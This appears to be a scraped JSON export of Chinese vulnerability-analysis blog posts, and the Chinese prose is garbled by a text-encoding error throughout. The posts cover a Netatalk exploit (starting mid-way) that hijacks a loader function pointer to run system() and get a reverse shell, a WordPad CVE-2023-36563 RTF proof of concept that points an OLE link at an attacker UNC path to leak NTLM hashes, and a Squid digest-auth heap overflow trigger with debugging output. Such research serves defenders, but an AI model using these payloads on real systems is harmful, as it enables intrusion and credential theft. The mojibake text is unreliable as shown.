åˆå§‹åŒ–è¿‡çš„å…¨å±€å˜é‡å­˜æ”¾åœ¨.dataæ®µï¼Œåœ¨ld.soä¸­.dataæ®µçš„åç§»ä¸º0x2e060ã€‚\næ­¤æ—¶å¯ä»¥åˆ©ç”¨ä»»æ„å†™å°†è·å–åˆ°çš„systemå‡½æ•°åœ°å€è¦†ç›–åˆ°__rtld_lock_lock_recursive å†…ï¼Œå¹¶ä¸”å°†è¦æ‰§è¡Œçš„å‘½ä»¤æ”¾å…¥_dl_load_lock å³å¯é€ æˆå‘½ä»¤æ‰§è¡Œã€‚\nå‘½ä»¤æ‰§è¡Œ\næ­¤å‰è¯´è¿‡ä»»æ„å†™æ˜¯å°†map + ad.ADEID_RFORK.off å¤„é•¿ä¸ºad.ADEID_RFORK.lençš„æ•°æ®å†™å…¥åˆ°map + ad.ADEID_FINDERI.off + 0x20 å†…ï¼Œè€Œåœ¨åˆ†é…å¤§å°å°äº0x1000æƒ…å†µä¸‹ï¼Œmmapå‡½æ•°åˆ†é…çš„å†…å­˜åˆšå¥½åœ¨dataæ®µä¸Šé¢ï¼Œæ­¤æ—¶mmapåˆ†é…çš„å†…å­˜åœ°å€è·ç¦»è¦è¦†ç›–çš„_dl_load_lock å‚æ•°ä¸º0x2968ï¼Œä»¥æ­¤å¯å¾—ad.ADEID_FINDERI.off=0x2940\n$7 = (__rtld_lock_recursive_t *) 0x7efeac865968 \u0026lt;_rtld_global+2312\u0026gt; gefâ¤ p \u0026amp;_rtld_global._dl_load_lock Quit gefâ¤ p 0x7efeac865968 - 0x7efeac863000 $8 = 0x2968 åŒæ—¶è¿˜è¦è¦†ç›–åˆ°__rtld_lock_lock_recursive å‡½æ•°æŒ‡é’ˆï¼Œæµ‹ç®—å¯å¾—è‡³å°‘éœ€è¦å¤åˆ¶0x600çš„é•¿åº¦æ‰èƒ½è¦†ç›–åˆ°å‡½æ•°æŒ‡é’ˆï¼Œæ­¤å¤„å¯ä»¥è®¾ç½®å¤åˆ¶é•¿åº¦ä¸º0x620\ngefâ¤ p \u0026amp;_rtld_global._dl_rtld_lock_recursive $10 = (void (**)(void *)) 0x7efeac865f68 \u0026lt;_rtld_global+3848\u0026gt; gefâ¤ p 0x7efeac865f68 - 0x7efeac863000 $11 = 0x2f68 gefâ¤ p 0x2f68 - 0x2968 $12 = 0x600 åˆ©ç”¨ä¸Šè¿°åç§»ï¼ŒåŠ ä¸Šè®¡ç®—å¾—åˆ°çš„systemå‡½æ•°åœ°å€ï¼Œç”Ÿæˆå¯ç”¨æ–‡ä»¶ï¼Œå¦‚ä¸‹ï¼š\næ­¤æ—¶åœ¨ç›®æ ‡ä¸»æœºå†…å·²æœ‰äº†è¯¥å®šæ—¶ä»»åŠ¡ï¼Œåœ¨æ”»å‡»æœºä¸Šç›‘å¬2333ç«¯å£å³å¯æ”¶åˆ°åå¼¹çš„shell\nè¡¥ä¸åˆ†æ åœ¨Netatalk3.1.13ç‰ˆæœ¬ä¸­ä¿®å¤äº†è¯¥æ¼æ´ï¼Œåœ¨æ–°ç‰ˆæœ¬ä¸­ï¼Œå…ˆæ£€æŸ¥ifä¸­çš„æ¡ä»¶è€Œåç»™adæŒ‡å‘çš„ç»“æ„ä½“èµ‹å€¼ï¼Œå¦‚æœifä¸­æ¡ä»¶ä¸ºçœŸï¼Œä¹Ÿå°±æ˜¯å¯èƒ½å‘ç”Ÿäº†è¶Šç•Œåˆ™ç›´æ¥æ‰“å°é”™è¯¯æ¶ˆæ¯è€Œåreturn -1ï¼Œåªæœ‰ifæ¡ä»¶ä¸æ»¡è¶³æ‰ç»§ç»­èµ‹å€¼ï¼Œä»è€Œé˜²æ­¢äº†adoubleç»“æ„ä½“å«æœ‰ä¸æ­£ç¡®çš„åç§»ï¼Œåœ¨å¤–å±‚å‡½æ•°è·å–åˆ°çš„åç§»åœ¨èŒƒå›´å†…ä»è€Œä¿®å¤äº†è¯¥æ¼æ´ã€‚\nå‡½æ•°è§£é‡Š **void** *memmove (**void** *__dest, **const** **void** *__src, size_t __n) // destæŒ‡å‘è¦å¤åˆ¶çš„ç›®æ ‡å†…å­˜ï¼ŒsrcæŒ‡å‘è¦å¤åˆ¶çš„æ•°æ®å†…å­˜ï¼Œnä¸ºè¦å¤åˆ¶çš„å¤§å°ï¼ˆå­—èŠ‚ï¼‰ // å¦‚æœdestå’ŒsrcæŒ‡å‘çš„å†…å­˜é‡å ï¼Œè¯¥å‡½æ•°ä»ç„¶å¯ä»¥æ­£å¸¸å¤„ç†ï¼Œé€»è¾‘å¦‚ä¸‹ char str[] = \u0026#34;memmove can be very useful......\u0026#34;; memmove (str+20,str+15,11); // è¾“å‡ºä¸º memmove can be very very useful. å‚è€ƒé“¾æ¥ https://code.woboq.org/userspace/glibc/elf/dl-open.c.html#_dl_open\nhttps://nosec.org/home/detail/4997.html\nhttps://research.nccgroup.com/2022/03/24/remote-code-execution-on-western-digital-pr4100-nas-cve-2022-23121/\nCreated at 2023-11-23T10:46:28+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/cve-2023-36563-wordpad-info-disclosure/","title":"CVE-2023-36563 Wordpad Info Disclosure åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ wordpadåœ¨è§£ærtfæ–‡ä»¶åŒ…å«çš„oleå¯¹è±¡æ—¶ä¼šå°è¯•è®¿é—®Linked objectçš„TopicæŒ‡å‘çš„æ–‡ä»¶ï¼Œå¦‚æœTopicæ˜¯ä¸€ä¸ªUNCè·¯å¾„åˆ™ä¼šå°è¯•é€šè¿‡ç½‘ç»œè®¿é—®ï¼Œå¹¶å°è¯•ä½¿ç”¨NTLMè®¤è¯ï¼Œå¯¼è‡´æ³„éœ²NTLM hashã€‚\nå½±å“ç‰ˆæœ¬ ç•¥\nç¯å¢ƒæ­å»º windows 10 21h2 2023-09è¡¥ä¸ æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• åˆæ¬¡çœ‹è¿™ä¸ªæ¼æ´ï¼Œç›´è§‰ä¸Šå¾ˆç±»ä¼¼ä»Šå¹´4æœˆä»½çš„åœ¨é‡åˆ©ç”¨æ¼æ´\rCVE-2023-23397 outlook æƒé™æå‡æ¼æ´ï¼Œéƒ½æ˜¯æ³„éœ²NTLM hashï¼Œè¯¥æ¼æ´ä¹Ÿå¯èƒ½æ˜¯åœ¨æŸç§æ–‡ä»¶çš„æŸä¸ªå±æ€§ä½¿ç”¨äº†UNCè·¯å¾„ï¼Œä½¿å¾—wordpadåŠ è½½è¿œç¨‹èµ„æºï¼Œé€ æˆNTLM hashæ³„éœ²ã€‚\nè¡¥ä¸diff\ndiff wordpad.exeï¼Œå¯ä»¥çœ‹åˆ°ä¿®æ”¹äº†å¦‚ä¸‹å‡½æ•° åŒæ—¶åœ¨ä¿®å¤åçš„wordpad.exeä¸­æ–°å¢äº†QueryConvertOLELinkCallbackå‡½æ•°å’Œ_LoadImageWithWIC_0ï¼Œæ ¹æ®å¾®è½¯çš„å‡½æ•°å‘½åè§„åˆ™ï¼ŒQueryConvertOLELinkCallbackå¯èƒ½ç”¨äºæŸ¥è¯¢å¹¶è½¬æ¢OLEé“¾æ¥å›è°ƒå‡½æ•°ï¼Œæ¯”è¾ƒç¬¦åˆæˆ‘ä»¬çš„çŒœæµ‹ã€‚ é™„ä¸ŠAIè§£é‡Š å¯¹æ¯”å„ä¸ªä¿®æ”¹åçš„å‡½æ•°ï¼Œå¯ä»¥çœ‹å‡ºLoadImageResourceä¸ºåŠ è½½Imageçš„èµ„æºèŠ‚é‡Œé¢çš„èµ„æºï¼Œä¸æ˜¯å¾ˆç¬¦åˆæˆ‘ä»¬ä¹‹å‰çš„å‡è®¾ å›åˆ°è¡¥ä¸æ–°å¢çš„å‡½æ•°ä¸­ï¼Œå¯¹äºæ–°å¢çš„å‡½æ•°QueryConvertOLELineCallbackï¼Œå…¶åœ¨CRichEdit2View::OnCreateå‡½æ•°ä¸­è°ƒç”¨ï¼Œåœ¨diffä¸­å¯ä»¥çœ‹åˆ°è¡¥ä¸ä¸­å°†è¯¥å‡½æ•°ä½œä¸ºå›è°ƒå‡½æ•°æŒ‡é’ˆä¼ é€’ç»™äº†SendMessageWï¼Œç›®æ ‡çª—å£å¯ä»¥å–å‡ºè¿™ä¸ªå›è°ƒå‡½æ•°æŒ‡é’ˆå¹¶è°ƒç”¨\nåˆ†æåˆ°è¿™å¯ä»¥çŒœæµ‹æ˜¯wordpadæ‰“å¼€OLEå¯¹è±¡æ—¶ï¼Œå°†æŸä¸ªå±æ€§ä½œä¸ºUNCè·¯å¾„è¿›è¡Œäº†è§£æå¹¶è®¿é—®ï¼Œå¯¼è‡´NTLM hashæ³„éœ²ã€‚ oleå¯¹è±¡ç›¸å…³åŠŸèƒ½ç”±ole32.dllå®ç°ï¼Œdiff ole32.dllï¼Œä¸»è¦ä¿®æ”¹äº†å¦‚ä¸‹å‡½æ•°\nOLESTREAMToGenericObject wConvertOLESTREAMToIStorage OleConvertOLESTREAMToIStorage OleConvertOLESTREAMToIStorageEx æ–°å¢äº†å¦‚ä¸‹å‡½æ•°\nIsAppExcludedFromOLELinkConversionRegistrySetting CheckOLELinkConversionRegistrySetting FindStringInMultiString OleConvertOLESTREAMToIStorage2 OleConvertOLESTREAMToIStorageEx2 åœ¨OLESTREAMToGenericObjectå‡½æ•°diffä¸­å¯ä»¥çœ‹åˆ°è°ƒç”¨äº†wordpadä¸­ä¼ é€’çš„å‡½æ•°æŒ‡é’ˆQueryConvertOLELineCallbackï¼Œå¹¶ä½¿ç”¨PrependUNCNameå°†szUNCæ·»åŠ UNCè·¯å¾„åèµ‹ç»™a2-\u0026gt;m_szTopicã€‚ å› æ­¤å¯ä»¥å¾—å‡ºç»“è®ºï¼šè¯¥æ¼æ´æ˜¯å°†oleå¯¹è±¡çš„m_szTopicä½œä¸ºUNCè·¯å¾„è¿›è¡Œè®¿é—®ã€‚\nè°·æ­Œæœç´¢OLESTREAMToGenericObjectï¼Œåœ¨å…¶ä»–å®‰å…¨ç ”ç©¶å‘˜å‘è¡¨çš„\rå…¶ä»–oleæ¼æ´åˆ†æä¸­çœ‹åˆ°äº†å¦‚ä¸‹\nOLEæ ¼å¼å¯ä»¥åœ¨\rOLDå¾®è½¯å®˜æ–¹æ–‡æ¡£ä¸­çœ‹åˆ°ï¼ŒFormatIDæ ‡è¯†äº†oleå¯¹è±¡ç±»å‹ï¼Œæ ¹æ®ä¹‹å‰çš„åˆ†æå¯ä»¥çŸ¥é“æ˜¯LinkedObjectå¯¼è‡´äº†è¯¥æ¼æ´çš„äº§ç”Ÿã€‚ æ ¹æ®\rå¾®è½¯æ–‡æ¡£ï¼ŒLinkedObjectæ˜¯å•ç‹¬çš„æºæ–‡ä»¶ä¸­çš„å¯¹è±¡ã€‚å¦‚æœæºæ–‡ä»¶ä¸­çš„å¯¹è±¡å‘ç”Ÿæ›´æ”¹ï¼Œåˆ™æ–‡æ¡£ä¸­çš„å¯¹è±¡å°†è‡ªåŠ¨æ›´æ–°ä»¥åæ˜ è¿™äº›æ›´æ”¹ã€‚\nlinked object: An object that is inserted into a document and continues to exist in a separate source file. If the object in the source file changes, the object in the document is updated automatically to reflect those changes.\né€šè¿‡wordpadåˆ›å»ºä¸€ä¸ªrtfæ–‡ä»¶å¹¶åµŒå…¥oleå¯¹è±¡ï¼Œä½¿ç”¨ç¼–è¾‘å™¨æ‰“å¼€å¯ä»¥çœ‹åˆ°å¦‚ä¸‹ï¼Œæ ¹æ®æ–‡æ¡£å¯çŸ¥è¯¥oleå¯¹è±¡ç±»å‹ä¸ºEmbedObject\n{\\rtf1\\ansi\\ansicpg54936\\deff0\\nouicompat\\deflang1033\\deflangfe2052{\\fonttbl{\\f0\\fnil\\fcharset134 \\\u0026#39;cb\\\u0026#39;ce\\\u0026#39;cc\\\u0026#39;e5;}} {\\*\\generator Riched20 10.0.19041}\\viewkind4\\uc1 \\pard\\sa200\\sl276\\slmult1\\f0\\fs22\\lang2052 fff{\\object\\objemb{\\*\\objclass PBrush}\\objw2835\\objh2835{\\*\\objdata 01050000 02000000 07000000 50427275736800 00000000 00000000 a0a30100 424d8ea30100000000003600000028000000bd000000bd000000010018000000000058a3010000 000000000000000000000000000000ffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff ä¸‹è½½\role toolsï¼ŒæŸ¥çœ‹wordpadç”Ÿæˆçš„rtfæ–‡ä»¶ä¿¡æ¯\nâœ rtfobj.exe .\\test.rtf rtfobj 0.60.1 on Python 3.9.6 - http://decalage.info/python/oletools THIS IS WORK IN PROGRESS - Check updates regularly! Please report any issue at https://github.com/decalage2/oletools/issues =============================================================================== File: \u0026#39;.\\\\test.rtf\u0026#39; - size: 661865 bytes ---+----------+--------------------------------------------------------------- id |index |OLE Object ---+----------+--------------------------------------------------------------- 0 |00000118h |format_id: 2 (Embedded) | |class name: b\u0026#39;PBrush\u0026#39; | |data size: 107424 | |MD5 = \u0026#39;6eb1e875d3759af5e4b65cd324182471\u0026#39; ---+----------+--------------------------------------------------------------- æˆ‘ä»¬çŸ¥é“Topicå±æ€§æ˜¯è§¦å‘æ¼æ´çš„å…³é”®ï¼Œé€šè¿‡æŸ¥çœ‹oleæ–‡æ¡£æ‰¾åˆ°äº†å…³é”®ä¿¡æ¯ï¼Œå¦‚æœLinkedObjectåŒ…å«äº†ObjectHeaderç»“æ„ï¼Œåˆ™TopicNameå¿…é¡»åŒ…å«æŒ‡å‘é“¾æ¥çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™ä¸ªè·¯å¾„å¿…é¡»æ˜¯ç»å¯¹è·¯å¾„æˆ–è€…æ˜¯UNCè·¯å¾„ æ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†UNCè·¯å¾„è®¾ç½®ä¸ºæˆ‘ä»¬çš„æ¶æ„æœåŠ¡å™¨ï¼Œé‡æ–°æ„é€ rtfæ–‡ä»¶ï¼ŒæˆåŠŸè§¦å‘\n{\\rtf1\\ansi\\ansicpg54936\\deff0\\nouicompat\\deflang1033\\deflangfe2052{\\fonttbl{\\f0\\fnil\\fcharset134 \\\u0026#39;cb\\\u0026#39;ce\\\u0026#39;cc\\\u0026#39;e5;}} {\\*\\generator Riched20 10.0.19041}{\\*\\mmathPr\\mdispDef1\\mwrapIndent1440 }\\viewkind4\\uc1 \\pard\\sa200\\sl276\\slmult1\\f0\\fs22\\lang2052{\\object\\objemb{\\*\\objclass Word.Document.8}\\objw585\\objh795{\\*\\objdata 01050000 01000000 10000000 576f72642e446f63756d656e742e3800 17000000 5c5c3139322e3136382e35322e3135365c312e72746600 00000000 00000000 00000000 00000000 01050000 05000000 10000000 576f72642e446f63756d656e742e3800 0e000000 74400000 0100090000033a20000009001610000000001610000026060f002220574d464301000000000001 æ³¨æ„åˆ°å³ä½¿è®¾ç½®äº†MotWï¼Œè™½ç„¶wordpadä¼šæ˜¾ç¤ºè­¦å‘Šï¼Œä½†ä»ç„¶ä¼šè®¿é—®TopicæŒ‡å‘çš„èµ„æºï¼Œåœ¨procmonitorä¸­å¯ä»¥çœ‹åˆ°å¦‚ä¸‹äº‹ä»¶ è¡¥ä¸å’Œç¼“è§£æªæ–½åˆ†æ\nå¾®è½¯åœ¨è¡¥ä¸æ—¥åå‘å¸ƒäº†\rä¸€ç¯‡æ–‡ç« ï¼ŒæŒ‡å‡ºå¯ä»¥åœ¨ HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Ole\\AppCompat\\OLELinkConversionFromOLESTREAMToIStorageä¸­æ·»åŠ DWORDçš„Disabledå€¼0x00000001æ¥ç¦ç”¨ï¼Œä½†æˆ‘åœ¨win 10 21h2 9æœˆè¡¥ä¸ä¸­åº”ç”¨äº†æ­¤æ–¹æ³•ï¼Œä½†ä¸èµ·ä½œç”¨ï¼Œwordpadæ²¡æœ‰è¯»å–è¿™ä¸ªæ³¨å†Œè¡¨ã€‚æ‰“å¼€æ–‡ä»¶åä»ç„¶è®¿é—®äº†UNCè·¯å¾„ï¼Œæ³„éœ²äº†NTLM hash\nåœ¨å‰æ–‡è¡¥ä¸åˆ†æä¸­å·²çŸ¥ï¼Œwordpadä¼šä¼ é€’å›è°ƒå‡½æ•°ç»™ole32ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œåœ¨ole32ä¸­ï¼Œä¼šå…ˆæ£€æŸ¥æ³¨å†Œè¡¨æ˜¯å¦ç¦ç”¨äº†oleå¯¹è±¡é“¾æ¥è½¬æ¢ï¼Œè€Œåæ£€æŸ¥å½“å‰è¿›ç¨‹æ˜¯å¦åœ¨ç™½åå•å†…ï¼Œæœ€åè€Œåè°ƒç”¨ç”¨æˆ·æä¾›çš„å›è°ƒå‡½æ•°ï¼Œä»¥è¿è¡Œç”¨æˆ·è‡ªå®šä¹‰çš„è§„åˆ™ã€‚\nPoCæ„é€ \næ‰“å¼€wordpadï¼Œæ’å…¥ä¸€ä¸ªrtfå¯¹è±¡ï¼Œè€Œåå°†Topicçš„é•¿åº¦å’Œnameå­—æ®µæ›¿æ¢ä¸ºUNCè·¯å¾„å³å¯ï¼Œç¨æ™šä¿©å¤©pocä¼šå…¬å¸ƒåœ¨æˆ‘çš„GitHub\nhttps://github.com/Chestnuts4/POC å°ç»“ è¿™ä¸ªæ¼æ´å’Œé¢„æƒ³ä¸­ä¸€æ ·ï¼Œæ˜¯ç”±äºæŸä¸ªå±æ€§å¯ä»¥è¢«è®¾ç½®ä¸ºUNCè·¯å¾„ï¼Œè€Œåwordpadä¼šè®¿é—®è¿™ä¸ªUNCè·¯å¾„ï¼Œè™½ç„¶æ–‡ä»¶è®¾ç½®äº†MotWæ ‡è¯†ï¼Œwordpadæ˜¾ç¤ºäº†è­¦å‘Šï¼Œä½†åå¸¸çš„æ˜¯wordpadä»ç„¶åœ¨ç”¨æˆ·æ²¡æœ‰åŒæ„çš„æƒ…å†µä¸‹è®¿é—®äº†ç›®æ ‡UNCè·¯å¾„ï¼Œè¿™ä¸€ç‚¹æ¯”è¾ƒåç›´è§‰ã€‚\nå‚è€ƒé“¾æ¥\nhttps://securityonline.info/poc-released-for-microsoft-wordpad-cve-2023-36563-flaw-exploited-in-attacks/\nhttps://www.dillonfrankesecurity.com/posts/cve-2023-36563-wordpad-analysis/\nCreated at 2023-10-31T17:12:19+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/vulnerability/squid-dos/","title":"Squid æ‹’ç»æœåŠ¡æ¼æ´åˆ†æ","tags":["æ¼æ´åˆ†æ"],"description":"","content":"åŸºæœ¬ä¿¡æ¯ å¼€å¯äº†digestèº«ä»½è®¤è¯çš„squidä»£ç†æœåŠ¡å™¨å­˜åœ¨å †æº¢å‡ºæ¼æ´ï¼Œæœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´é€ æˆæ‹’ç»æœåŠ¡ã€‚\næŒ‡çº¹ hunter\nweb.title=\u0026#34;ERROR The requested URL could not be retrieved\u0026#34; å½±å“ç‰ˆæœ¬ squid\n3.2.0.1-5.9, 6.0-6.3 ç¯å¢ƒæ­å»º æŒ‰ç…§configureè„šæœ¬çš„æç¤ºå®‰è£…å„ä¸ªä¾èµ–ï¼Œè€Œåæ‰§è¡Œå¦‚ä¸‹ï¼š\nexport C_INCLUDE_PATH=/usr/include/libxml2 export CPLUS_INCLUDE_PATH=/usr/include/libxml2 ./configure \u0026#39;--build=x86_64-linux-gnu\u0026#39; \u0026#39;--prefix=/root/squid/squid-6.3/build\u0026#39; \u0026#39;--includedir=${prefix}/include\u0026#39; \u0026#39;--mandir=${prefix}/share/man\u0026#39; \u0026#39;--infodir=${prefix}/share/info\u0026#39; \u0026#39;--sysconfdir=/etc\u0026#39; \u0026#39;--localstatedir=/var\u0026#39; \u0026#39;--disable-option-checking\u0026#39; \u0026#39;--disable-silent-rules\u0026#39; \u0026#39;--libdir=${prefix}/lib/x86_64-linux-gnu\u0026#39; \u0026#39;--runstatedir=/run\u0026#39; \u0026#39;--disable-maintainer-mode\u0026#39; \u0026#39;--disable-dependency-tracking\u0026#39; \u0026#39;BUILDCXXFLAGS=-g -O2 -ffile-prefix-map=/build/reproducible-path/squid-6.3=. -fstack-protector-strong -fstack-clash-protection -Wformat -Werror=format-security -fcf-protection -Wno-error=deprecated-declarations -Wdate-time -D_FORTIFY_SOURCE=2 -Wl,-z,relro -Wl,-z,now \u0026#39; \u0026#39;BUILDCXX=g++\u0026#39; \u0026#39;--with-build-environment=default\u0026#39; \u0026#39;--enable-build-info=Debian linux\u0026#39; \u0026#39;--datadir=/usr/share/squid\u0026#39; \u0026#39;--sysconfdir=/etc/squid\u0026#39; \u0026#39;--libexecdir=/usr/lib/squid\u0026#39; \u0026#39;--mandir=/usr/share/man\u0026#39; \u0026#39;--enable-inline\u0026#39; \u0026#39;--disable-arch-native\u0026#39; \u0026#39;--enable-async-io=8\u0026#39; \u0026#39;--enable-storeio=ufs,aufs,diskd,rock\u0026#39; \u0026#39;--enable-removal-policies=lru,heap\u0026#39; \u0026#39;--enable-delay-pools\u0026#39; \u0026#39;--enable-icap-client\u0026#39; \u0026#39;--enable-follow-x-forwarded-for\u0026#39; \u0026#39;--enable-auth-basic=DB,fake,getpwnam,LDAP,NCSA,PAM,POP3,RADIUS,SASL,SMB\u0026#39; \u0026#39;--enable-auth-digest=file,LDAP\u0026#39; \u0026#39;--enable-auth-negotiate=wrapper\u0026#39; \u0026#39;--enable-auth-ntlm=fake,SMB_LM\u0026#39; \u0026#39;--enable-external-acl-helpers=file_userip,LDAP_group,SQL_session,unix_group,wbinfo_group\u0026#39; \u0026#39;--enable-security-cert-validators=fake\u0026#39; \u0026#39;--enable-storeid-rewrite-helpers=file\u0026#39; \u0026#39;--enable-url-rewrite-helpers=fake\u0026#39; \u0026#39;--enable-eui\u0026#39; \u0026#39;--enable-esi\u0026#39; \u0026#39;--enable-zph-qos\u0026#39; \u0026#39;--disable-translation\u0026#39; \u0026#39;--with-swapdir=/var/spool/squid\u0026#39; \u0026#39;--with-logdir=/var/log/squid\u0026#39; \u0026#39;--with-pidfile=/run/squid.pid\u0026#39; \u0026#39;--with-filedescriptors=65536\u0026#39; \u0026#39;--with-large-files\u0026#39; \u0026#39;--with-default-user=proxy\u0026#39; \u0026#39;--enable-linux-netfilter\u0026#39; \u0026#39;--without-systemd\u0026#39; \u0026#39;--with-gnutls\u0026#39; \u0026#39;build_alias=x86_64-linux-gnu\u0026#39; \u0026#39;CFLAGS=-g -O2 -ffile-prefix-map=/build/reproducible-path/squid-6.3=. -fstack-protector-strong -fstack-clash-protection -Wformat -Werror=format-security -fcf-protection -Wno-error=deprecated-declarations\u0026#39; \u0026#39;LDFLAGS=-Wl,-z,relro -Wl,-z,now \u0026#39; \u0026#39;CPPFLAGS=-Wdate-time -D_FORTIFY_SOURCE=2\u0026#39; \u0026#39;CXXFLAGS=-g -O2 -ffile-prefix-map=/build/reproducible-path/squid-6.3=. -fstack-protector-strong -fstack-clash-protection -Wformat -Werror=format-security -fcf-protection -Wno-error=deprecated-declarations\u0026#39; \u0026#39;--disable-optimizations\u0026#39; é…ç½®åœ¨squid.confæ·»åŠ å¦‚ä¸‹\nauth_param digest program /usr/lib/squid/digest_file_auth -c /etc/squid/password.digest auth_param digest realm localhost acl authenticated proxy_auth REQUIRED http_access allow authenticated http_port 3128 test:localhost:39df1982ed1fef9f74ecd670a2a93c66 ä½¿ç”¨å¦‚ä¸‹è¯·æ±‚è§¦å‘\ncurl -i -k http://116.62.202.230 -x 192.168.59.197:3128 -U test:123456 --proxy-digest æŠ€æœ¯åˆ†æ\u0026amp;è°ƒè¯• è¡¥ä¸åˆ†æ\nè¡¥ä¸ä¿®å¤äºsrc\\auth\\digest\\Config.ccï¼Œå¯ä»¥çœ‹å‡ºè¡¥ä¸ä¸»è¦æ˜¯å¯¹value.sizeè¿›è¡Œäº†åˆ¤æ–­ï¼Œåœ¨ä¿®å¤å‰è™½ç„¶åˆ¤æ–­äº†value.size()æ˜¯å¦ä¸º8ï¼Œä½†ä»…ä»…æ‰“å°äº†ä¸€æ¡è°ƒè¯•ä¿¡æ¯ï¼Œåé¢ä»ç„¶è°ƒç”¨xstrncpyè¿›è¡Œå¤åˆ¶ã€‚ åœ¨è¡¥ä¸å¤„å¦‚æœncå‚æ•°ä¸æ˜¯8åˆ™ä¸ä¼šè°ƒç”¨xstrncpyè¿›è¡Œå¤åˆ¶ã€‚ è€Œxstrncpyè¦å†™å…¥çš„é•¿åº¦å‚æ•°æ¥æºäºvalue.size()ï¼Œvalueæ˜¯ä¸€ä¸ªStringç±»å‹å˜é‡\ncase DIGEST_NC: if (value.size() != 8) { debugs(29, 9, \u0026#34;Invalid nc \u0026#39;\u0026#34; \u0026lt;\u0026lt; value \u0026lt;\u0026lt; \u0026#34;\u0026#39; in \u0026#39;\u0026#34; \u0026lt;\u0026lt; temp \u0026lt;\u0026lt; \u0026#34;\u0026#39;\u0026#34;); } xstrncpy(digest_request-\u0026gt;nc, value.rawBuf(), value.size() + 1); debugs(29, 9, \u0026#34;Found noncecount \u0026#39;\u0026#34; \u0026lt;\u0026lt; digest_request-\u0026gt;nc \u0026lt;\u0026lt; \u0026#34;\u0026#39;\u0026#34;); break; char * xstrncpy(char *dst, const char *src, size_t n) { char *r = dst; if (!n || !dst) return dst; if (src) while (--n != 0 \u0026amp;\u0026amp; *src != \u0026#39;\\0\u0026#39;) { *dst = *src; ++dst; ++src; } *dst = \u0026#39;\\0\u0026#39;; return r; } å¯ä»¥çœ‹å‡ºè¿™æ˜¯ä¸€ä¸ªè¶Šç•Œå†™æ¼æ´ï¼Œå¯ä»¥é€ æˆå †æº¢å‡ºã€‚ åŠ¨æ€è°ƒè¯•\næ–­ç‚¹å¦‚ä¸‹\ngefâ¤ b Auth::Digest::Config::decode gefâ¤ b Config.cc:829 é€šè¿‡curlè§¦å‘æ–­ç‚¹\ncurl -i -k http://host -x 192.168.59.197:3128 -U test:123456 --proxy-digest æ­¤æ—¶è°ƒç”¨æ ˆå¦‚ä¸‹\ngefâ¤ bt #0 Auth::Digest::Config::decode (this=0x55a2e598a470, proxy_auth=0x55a2e5cc50e7 \u0026#34;username=\\\u0026#34;test\\\u0026#34;,realm=\\\u0026#34;localhost\\\u0026#34;,nonce=\\\u0026#34;52a18c55ec2a173b665ae8c4d1b947b6\\\u0026#34;,uri=\\\u0026#34;/\\\u0026#34;,cnonce=\\\u0026#34;b315dc470396be779b18a73909a139f1\\\u0026#34;,nc=00000001,response=\\\u0026#34;edda2d0982c717bd74ad9989da11b158\\\u0026#34;,qop=\\\u0026#34;auth\\\u0026#34;\u0026#34;, request=0x55a2e61210e0, aRequestRealm=0x0) at Config.cc:830 #1 0x000055a2e483a895 in Auth::SchemeConfig::CreateAuthUser ( proxy_auth=0x55a2e5cc50e0 \u0026#34;Digest username=\\\u0026#34;test\\\u0026#34;,realm=\\\u0026#34;localhost\\\u0026#34;,nonce=\\\u0026#34;52a18c55ec2a173b665ae8c4d1b947b6\\\u0026#34;,uri=\\\u0026#34;/\\\u0026#34;,cnonce=\\\u0026#34;b315dc470396be779b18a73909a139f1\\\u0026#34;,nc=00000001,response=\\\u0026#34;edda2d0982c717bd74ad9989da11b158\\\u0026#34;,qop=\\\u0026#34;auth\\\u0026#34;\u0026#34;, al=...) at SchemeConfig.cc:55 #2 0x000055a2e4840d94 in Auth::UserRequest::authenticate (auth_user_request=0x55a2e611ee20, headertype=Http::PROXY_AUTHORIZATION, request=0x55a2e61210e0, conn=0x55a2e6118e78, src_addr=..., al=...) at UserRequest.cc:354 #3 0x000055a2e4841952 in Auth::UserRequest::tryToAuthenticateAndSetAuthUser (aUR=0x55a2e611ee20, headertype=Http::PROXY_AUTHORIZATION, request=0x55a2e61210e0, conn=0x55a2e6118e78, src_addr=..., al=...) at UserRequest.cc:453 #4 0x000055a2e4807766 in AuthenticateAcl (ch=0x55a2e611ec88) at Acl.cc:57 #5 0x000055a2e4809a2d in ACLProxyAuth::match (this=0x55a2e598ac40, checklist=0x55a2e611ec88) at AclProxyAuth.cc:55 #6 0x000055a2e4861813 in ACL::matches (this=0x55a2e598ac40, checklist=0x55a2e611ec88) at Acl.cc:171 #7 0x000055a2e4866b75 in ACLChecklist::matchChild (this=0x55a2e611ec88, current=0x55a2e598bc50, pos=0x55a2e598ac40, child=0x55a2e598ac40) at Checklist.cc:93 #8 0x000055a2e4866018 in Acl::AndNode::doMatch (this=0x55a2e598bc50, checklist=0x55a2e611ec88, start=0x55a2e598ac40) at BoolOps.cc:76 #9 0x000055a2e486af59 in Acl::InnerNode::match (this=0x55a2e598bc50, checklist=0x55a2e611ec88) at InnerNode.cc:91 #10 0x000055a2e4861813 in ACL::matches (this=0x55a2e598bc50, checklist=0x55a2e611ec88) at Acl.cc:171 #11 0x000055a2e4866b75 in ACLChecklist::matchChild (this=0x55a2e611ec88, current=0x55a2e598c098, pos=0x55a2e598bc50, child=0x55a2e598bc50) at Checklist.cc:93 #12 0x000055a2e4866198 in Acl::OrNode::doMatch (this=0x55a2e598c098, 